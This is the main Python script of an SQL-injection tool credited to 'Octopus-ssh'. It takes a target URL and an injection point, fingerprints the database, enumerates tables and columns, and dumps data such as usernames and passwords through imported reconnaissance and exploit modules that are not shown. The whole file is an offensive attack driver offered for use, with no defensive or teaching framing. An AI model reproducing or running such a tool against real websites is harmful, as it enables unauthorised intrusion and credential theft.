from rich import print

print('''  [green]
        ___       _        _        _           _   _             
       / _ \  ___| |_ ___ (_)_ __  (_) ___  ___| |_(_) ___  _ __  
      | | | |/ __| __/ _ \| | '_ \ | |/ _ \/ __| __| |/ _ \| '_ \ 
      | |_| | (__| || (_) | | | | || |  __/ (__| |_| | (_) | | | |
       \___/ \___|\__\___/|_|_| |_|/ |\___|\___|\__|_|\___/|_| |_|
                                  |__/                            

                     SQLI tool made by Octopus-ssh   
     
''')

# import necessary libraries

import check_data # library about data function 

import reconnaissance # library about the active reconnaissance in a sqli 

import exploit # library about the retriving data (username,password,id and more.....)

# start the main 

try : # to prevent the errors 

        url,injection_point = check_data.take_data() # this function it's going to take url and injection point and count the arguments 
        
        status_code = check_data.is_it_200(url) # this function it's going to check the status code 

        if(status_code == 200) : # if the status code is 200

                count = reconnaissance.counting_argument(url,injection_point) # this function it's for count how many data i can inject

                print(f"\n[yellow][+] the argument aviable are {count}") # just output the counting data
                
                type = reconnaissance.type_database(url,injection_point,count) # this function it's for to know what kind of database we're attacking 

                print(f"\n[yellow][+] the type of your database is {type}") # just output the type 

                string = reconnaissance.type_argument(url,injection_point,count,type) # this function it's for to know if a argument is a string or int.......

                table = exploit.exploit_table(url,injection_point,type,count,string) # this function it's for to exploit the table_name

                column_1,column_2 = exploit.exploit_columns(url,injection_point,type,count,string,table) # this function it's for to exploit the columns
                
                exploit.showing_data(url,injection_point,type,count,string,table,column_1,column_2) # this function it's to see the data

except : # in case of any errors 

        print(f"[red][-] sorry but there is a problem [red]") # alert the error




